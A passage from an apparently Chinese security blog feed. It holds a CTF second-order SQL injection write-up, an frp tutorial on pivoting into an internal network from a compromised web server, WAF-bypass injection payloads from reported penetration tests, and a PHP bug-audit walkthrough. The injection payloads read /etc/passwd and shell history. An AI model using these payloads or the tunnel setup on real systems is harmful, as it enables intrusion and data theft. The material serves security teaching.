class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">$title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">$content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br></pre></td></tr></table></figure><p>而当<code>do=comment</code>时，直接传入未进行有效过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br></pre></td></tr></table></figure><p>源码中的<code>write</code>和<code>comment</code>分别对应<code>发帖</code>和<code>留言</code>界面，结合二者和题目靶机结构，可以构造代码完成二次注入的操作。</p><p>下面来看看具体如何实现，留言界面，构造<code>sql</code>语句，源码是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">        set category = &#x27;&#x27;,content=user(),/*&#x27;,</span></span><br><span class="line"><span class="string">            content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">            bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>发帖时，通过<code>addslashes()</code>函数转义存入数据库，再从数据库中查询放入<code>sql</code>语句，显示出来，这里没有进行转义，所以在留言时利用多行注释符<code>/**/</code>即可闭合<code>sql</code>语句，执行我们的查询内容。</p><p>来看看效果：</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-4.png" alt="18wdb-4"></p><p>然后查看详情，留言处将其闭合：</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-5.png" alt="18wdb-5"></p><p>点击提交，<code>sql</code>语句执行：</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-6.png" alt="18wdb-6"></p><p>接下来我们可以利用<code>sql</code>语句查询或配合<code>load_file()</code>函数读取服务器文件，直到读取到<code>flag</code>即可</p><p>读<code>/etc/passwd</code> :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=load_file(&quot;/etc/passwd&quot;),/*</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/18wdb-7.png" alt="18wdb-7"></p><p>最后一行可见<code>www</code>以<code>bash</code>身份运行，读<code>bash</code>历史操作<code>/home/www/.bash_history</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=load_file(&quot;/home/www/.bash_history&quot;),/*</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/18wdb-8.png" alt="18wdb-8"></p><p>格式化一下操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">unzip html.zip</span><br><span class="line">rm -f html.zip</span><br><span class="line">cp -r html /var/www/</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">rm -f .DS_Store</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>注意<code>/var/www/html</code>中的<code>.DS_Store</code>被删除了，但是<code>/tmp/html</code>下的该文件还存在，读之（外加一层<code>hex</code>编码，不然会显示不全）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/tmp/html/.DS_Store&quot;)),/*</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/18wdb-9.png" alt="18wdb-9"></p><p>字符很多，用<a href="http://tools.hackxc.cc/bm/">小陈师傅的在线工具</a>解码一下，可发现不是很清晰的<code>flag_8946e1ff1ee3e40f.php</code>字样</p><p><img src="https://oss.zjun.info/zjun.info/18wdb-10.png" alt="18wdb-10"></p><p>又读之</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span></span><br></pre></td></tr></table></figure><p>解码后得假的<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>换个目录读，因为是复制过来的，<code>/var/www/html/</code>中也自然有这个<code>flag</code>文件，读之</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</span></span><br></pre></td></tr></table></figure><p>得真<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag&#123;362afbce-ac8e-438f-b969-9b1ce19f874b&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> WriteUp </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透原理及实战应用</title>
      <link href="2020/frp-intranet-penetration.html"/>
      <url>2020/frp-intranet-penetration.html</url>
      
        <content type="html"><![CDATA[<p>近段时间不管遇到什么站只要其具备内网渗透环境，都手痒想打一打，这里写一下内网穿透原理及周边一些相关概念的解释，最后说一下怎样把frp用于内网渗透当中。</p><a id="more"></a><h2 id="NAT机制带来的问题"><a href="#NAT机制带来的问题" class="headerlink" title="NAT机制带来的问题"></a>NAT机制带来的问题</h2><p>先说说网络地址转换（即NAT）机制的问题，NAT设备自动屏蔽非内网主机发起的连接，会使得位于不同NAT设备之后的主机无法直接建立联系、交换信息，这一方面保护了内网主机免受外网攻击，另一方面也为P2P通信带来了一定困难。外部主机要与内网主机相互通信，必须由内网主机主动发起连接，使 NAT设备产生一个映射条目，这里为了解决这一窘境，就需要用到内网穿透技术，即 NAT 穿透，<font color=red>进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</font></p><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>外网主机没办法直接访问到内网资源，由于NAT机制的原因</p><p><img src="https://oss.zjun.info/zjun.info/frptest-1.webp" alt="frptest-1"></p><p>那如何能够成功访问内网，这里需要用到一个反向代理，将内网某端口转发到公网vps上，然后你对公网vps监听端口的访问就等同于对内网服务器转发出来的端口的访问</p><p><img src="https://oss.zjun.info/zjun.info/frptest-2.webp" alt="frptest-2"></p><h2 id="frp内网穿透的一个简单应用"><a href="#frp内网穿透的一个简单应用" class="headerlink" title="frp内网穿透的一个简单应用"></a>frp内网穿透的一个简单应用</h2><p>frp(fast reverse proxy)即快速反向代理</p><p><img src="https://oss.zjun.info/zjun.info/frptest-3.webp" alt="frptest-3"></p><p>上面这张图是frp基本架构，来自<a href="https://github.com/fatedier/frp">frp官方</a>介绍文档。</p><p>其中frps位于公网vps上，frpc位于内网的机器上</p><p>介绍一个简单的frp用例，用以实现公网访问你内网笔记本的web服务。</p><ul><li>公网vps的frps.ini配置：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br></pre></td></tr></table></figure><ul><li>启动frps</li></ul><p><code>./frps -c ./frps.ini</code></p><ul><li><p>内网笔记本 frpc.ini 配置：</p><p>x.x.x.x是公网vps地址</p></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br><span class="line"></span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure><ul><li>启动frpc</li></ul><p><code>./frpc -c ./frpc.ini</code></p><p>本地访问显示</p><p><img src="https://oss.zjun.info/zjun.info/frptest-4.png" alt="frptest-4"></p><p>访问x.x.x.x:7002</p><p><img src="https://oss.zjun.info/zjun.info/frptest-5.webp" alt="frptest-5"></p><p>其中frp详细的配置文档可见<a href="https://github.com/fatedier/frp/blob/master/README_zh.md">官方说明文档</a></p><h2 id="frp在内网渗透的应用"><a href="#frp在内网渗透的应用" class="headerlink" title="frp在内网渗透的应用"></a>frp在内网渗透的应用</h2><p>模拟一个常见的攻击环境</p><p><img src="https://oss.zjun.info/zjun.info/frptest-6.webp" alt="frptest-6"></p><p>防火墙右边部分为一个简化的内网环境，假如现在我有了门户网站的shell，而内网OA器不能直接从外网访问，因为管理员设了访问控制策略，OA系统只接收来自内网的访问，这时要想访问内网OA服务就需要利用内网穿透，实现一个反向代理。</p><p>门户网站frpc.ini文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7004</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><p>公网vps主机frps.ini文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = password</span><br></pre></td></tr></table></figure><p>我的笔记本安装<code>proxychains</code>，修改<code>/etc/prxoychains.conf</code>配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 x.x.x.x 7004</span><br></pre></td></tr></table></figure><p>配合<code>proxychains</code>代理到本地简直不要太方便，使用代理打开火狐浏览器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox</span><br></pre></td></tr></table></figure><p>现在等同于你的笔记本就处于目标内网当中！Enjoy It!</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Web渗透 </tag>
            
            <tag> Frp </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录几个实战sql绕过</title>
      <link href="2020/record-several-actual-sql-bypasses.html"/>
      <url>2020/record-several-actual-sql-bypasses.html</url>
      
        <content type="html"><![CDATA[<p>前段时间的几次渗透测试中有几个有意思的sql注入，记录一下注入的绕过，网站地址及部分信息都有模糊处理，并已反映给相关单位。</p><a id="more"></a><h2 id="0x01-案例一-绕安全狗"><a href="#0x01-案例一-绕安全狗" class="headerlink" title="0x01 案例一 绕安全狗"></a>0x01 案例一 绕安全狗</h2><p>加<code>&#39;</code>，报错，连sql语句都给了出来，典型的注入，原本以为属于可以直接一把梭的站</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-1.png" alt="sqlina-1"></p><p><code>order by</code>查字段遭遇安全狗拦截</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-2.png" alt="sqlina-2"></p><p>现在需要手动绕过，感觉这个安全狗应该是比较老的版本</p><p>过滤字符：</p><p><code>order by</code></p><p><code>union select</code></p><p><code>Length(database())</code></p><p>……</p><p>不过滤单个字符，只过滤了相关组合查询语句，一番手动测试成功测出<code>%23%0a</code>可以绕过安全狗拦截</p><p>查字段<code>payload</code>：</p><p><code>%20order%23%0aby%2013%23</code></p><p><code>%23</code>： <code>#</code></p><p><code>%0a</code>： <code>换行符</code></p><p><img src="https://oss.zjun.info/zjun.info/sqlina-3.png" alt="sqlina-3"></p><p>根据是否报错，查询出有<code>13</code>个字段，但是当使用<code>联合查询注入</code>或<code>盲注</code>时这个<code>payload</code>失效，再次绕过安全狗</p><p>终极<code>bypass</code>如下，采用<code>注释</code>绕过，同时<code>#</code>必须用<code>%23</code>，不然会被安全狗拦截</p><p><code>/*&amp;ID=-20 union select 1,2,3,4,5,6,7,8,9,10,11,12,13%23*/</code></p><p><img src="https://oss.zjun.info/zjun.info/sqlina-4.png" alt="sqlina-4"></p><h2 id="0x02-案例二-盲注绕WTS"><a href="#0x02-案例二-盲注绕WTS" class="headerlink" title="0x02 案例二 盲注绕WTS"></a>0x02 案例二 盲注绕WTS</h2><p>查询字段很顺利，直接<code>order by 2</code>查出<code>2个</code>字段但是<code>联合查询注入</code>失败，各种绕过都试了下均失败</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-5.png" alt="sqlina-5"></p><p>又试了下盲注，居然过了，只是过程稍显麻烦</p><p>数据库长度为<code>9</code></p><p><code>and Length(database())&gt;9%23</code></p><p>然后<code>burp</code>抓包，设置爆破范围</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-6.png" alt="sqlina-6"></p><p><code>and ORD(mid(database(),1,1))=95%23</code></p><p>设置<code>AIISC</code>范围<code>95～122</code>，因为<code>mysql</code>默认不区分大小写，默认都为小写</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-7.png" alt="sqlina-7"></p><p>一位一位爆库</p><p><img src="https://oss.zjun.info/zjun.info/sqlina-8.png" alt="sqlina-8"></p><p>不再赘述。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 安全狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php_bugs代码审计</title>
      <link href="2020/php-bugs-code-audit.html"/>
      <url>2020/php-bugs-code-audit.html</url>
      
        <content type="html"><![CDATA[<p>简单的php_bugs代码审计。</p><p>所有代码均来自：<a href="https://github.com/bowu678/php_bugs">https://github.com/bowu678/php_bugs</a></p><a id="more"></a><h2 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01 extract变量覆盖"></a>0x01 extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ctf&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当<code>$shiyan==$content</code>时输出<code>flag</code>，<code>$flag</code>赋给<code>$content</code>，这里不知道<code>$flag</code>的值，所以可以<code>get</code>一个<code>flag</code>变量覆盖<code>$flag</code>，当<code>get</code>的<code>flag</code>等于<code>get</code>的<code>shiyan</code>时即可输出<code>flag</code>。<br>构造<code>payload</code>:<br><code>?shiyan=&amp;flag=</code></p><h2 id="0x02-绕过过滤的空白字符"><a href="#0x02-绕过过滤的空白字符" class="headerlink" title="0x02 绕过过滤的空白字符"></a>0x02 绕过过滤的空白字符</h2><p>代码挺长的，就不放了，自行在<code>github</code>原项目上看。<br>主要满足四个点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">is_numeric(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;number&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line"><span class="variable">$req</span>[<span class="string">&#x27;number&#x27;</span>] == strval(intval(<span class="variable">$req</span>[<span class="string">&#x27;number&#x27;</span>]</span><br><span class="line">intval(<span class="variable">$req</span>[<span class="string">&quot;number&quot;</span>]) == intval(strrev(<span class="variable">$req</span>[<span class="string">&quot;number&quot;</span>])</span><br><span class="line">is_palindrome_number(<span class="variable">$req</span>[<span class="string">&quot;number&quot;</span>]) == <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>即可输出<code>flag</code>，构造如下：</p><ul><li>第一点<code>is_numeric()</code>判断变量是否为<code>数字</code>或<code>数字字符串</code>，可以检查<code>10进制</code>或<code>16进制</code>， <code>is_numeric()</code>可以用空字符绕过，<code>%00</code>放在数值<code>前、后</code>都可以判断为非数值，而<code>%20</code>空字符只能放在数值后。</li><li>第三点该<code>整数值</code>等于其<code>反转整数值</code>，第四点不为<code>回文数</code>，这两者看似矛盾，实则有多种绕过方法。</li></ul><p><strong>法一</strong></p><p>来自<a href="https://github.com/bowu678/php_bugs">php_bugs</a>，先满足<code>第三点</code>回文数再<code>Fuzzing</code>绕过<code>第四点</code>，简化后端代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$number</span> = strval(<span class="variable">$number</span>); <span class="comment">//strval — 获取变量的字符串值</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$j</span> = strlen(<span class="variable">$number</span>) - <span class="number">1</span>; <span class="comment">//strlen — 获取字符串长度</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$j</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$i</span>] !== <span class="variable">$number</span>[<span class="variable">$j</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="variable">$j</span>--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;number&#x27;</span>]);</span><br><span class="line">var_dump((<span class="variable">$a</span>==strval(intval(<span class="variable">$a</span>)))&amp;(intval(<span class="variable">$a</span>)==intval(strrev(<span class="variable">$a</span>)))&amp;!is_palindrome_number(<span class="variable">$a</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>数值</code>转成<code>2位16进制</code>加在<code>回文数</code> <code>191</code>前面，<code>Fuzzing</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    r = requests.get(url=<span class="string">&quot;http://arch/php_bugs/02.php?number=&#123;&#125;191&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;%%%02X&quot;</span>%i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">&quot;%%%02X&quot;</span>%i)</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><code>%0C</code><br><code>%2B</code></p><p>即可构成<code>payload</code>：<br><code>?number=%00%2C191</code></p><p><strong>法二</strong></p><p>仅限于<code>32位操作系统</code>，利用<code>intval()</code>函数的溢出，<code>Intval()</code>最大的值取决于<code>操作系统</code>。 <code>32 位系统</code>最大带符号的 <code>integer</code> 范围是<code> -2147483648</code> 到<code> 2147483647</code>。举例，在这样的系统上， <code>intval(&#39;1000000000000&#39;)</code> 会返回 <code>2147483647</code>。<code>64 位系统</code>上，最大带符号的 <code>integer</code> 值是 <code>9223372036854775807</code>。</p><p>如果在<code>32位操作系统</code>上我们可以构造<code>payload</code>：<code>?number=%002147483647 </code></p><p><code>2147483647</code>经过<code>strrev()</code>反转函数后为<code>7463847412</code>，又经过<code>intval</code>函数值又变为<code>2147483647</code>，故满足<code>第三点</code>条件，可以输出<code>flag</code>。</p><p><code>64位操作系统</code>最大<code>integer</code> 值是 <code>9223372036854775807</code>，经<code>strrev()</code>反转函数后为<code>7085774586302733229</code>反而变小了，未满足溢出条件，故不适用。</p><p><strong>法三</strong></p><p>因为要求不能为回文数，但又要满足<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>所以我们采用科学计数法构造<code>payload</code>为<code>?number=0e-0%00</code>，这样的话我们就可以绕过。</p><p><font color=red>参考：</font></p><p><a href="https://www.cnblogs.com/GH-D/p/8085676.html">is_numeric()</a><br><a href="http://blog.sina.com.cn/s/blog_90a0ad8d01014f03.html">%%%02x</a><br><a href="https://blog.csdn.net/qq_44105778/article/details/88955564">法二、三来源</a></p><h2 id="0x03-多重加密"><a href="#0x03-多重加密" class="headerlink" title="0x03 多重加密"></a>0x03 多重加密</h2><p><code>源码</code>中给出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$login</span> = unserialize(gzuncompress(base64_decode(<span class="variable">$requset</span>[<span class="string">&#x27;token&#x27;</span>])));</span><br><span class="line"><span class="comment">//gzuncompress:进行字符串压缩</span></span><br><span class="line"><span class="comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$login</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="string">&#x27;ichunqiu&#x27;</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure><p>有了<code>加密</code>方式，我们<code>解密</code>一下即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>([<span class="string">&#x27;user&#x27;</span>] === <span class="string">&#x27;ichunqiu&#x27;</span>);</span><br><span class="line"><span class="variable">$token</span> = base64_encode(gzcompress(serialize(<span class="variable">$arr</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></p><h2 id="0x04-SQL注入-WITH-ROLLUP绕过"><a href="#0x04-SQL注入-WITH-ROLLUP绕过" class="headerlink" title="0x04 SQL注入_WITH ROLLUP绕过"></a>0x04 SQL注入_WITH ROLLUP绕过</h2><p>这个题来自实验吧<code>因缺思汀的绕过</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"><span class="comment">// 过滤的字符</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行的sql语句</span></span><br><span class="line">mysql_num_rows(<span class="variable">$query</span>) == <span class="number">1</span></span><br><span class="line"><span class="comment">// 返回结果集中行的数目</span></span><br><span class="line"><span class="variable">$key</span>[<span class="string">&#x27;pwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]</span><br><span class="line"><span class="comment">// 提交的密码与数据库中的密码相等输出flag</span></span><br></pre></td></tr></table></figure><p><code>$_POST</code>输入通过定义的<code>AttackFilter()</code>函数过滤导致不能使用常规<code>sql注入</code>，这里的思路是<code>select</code>过程中用<code>group by with rollup</code>方法进行插入查询。</p><p>先来看看<code>group by with rollup</code>统计方法有什么作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> pwd    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> mypass <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span 